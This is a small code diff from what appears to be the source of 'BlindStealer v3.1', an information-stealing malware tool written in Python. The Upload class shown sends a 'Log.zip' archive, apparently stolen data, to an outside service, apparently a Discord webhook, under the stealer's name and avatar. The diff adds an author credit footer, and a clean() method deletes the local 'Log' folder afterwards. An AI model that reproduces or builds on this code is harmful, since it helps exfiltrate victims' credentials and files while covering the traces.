@@ -68,6 +68,7 @@ class Upload:
             file=File("Log.zip"),
                 username="BlindStealer - v3.1",
                 avatar_url="https://i.imgur.com/LNVOaxg.png",
+                footer="Blind v3.1 · Created by: readdone#1155",
         ) 
     def clean(self):
         shutil.rmtree("Log")
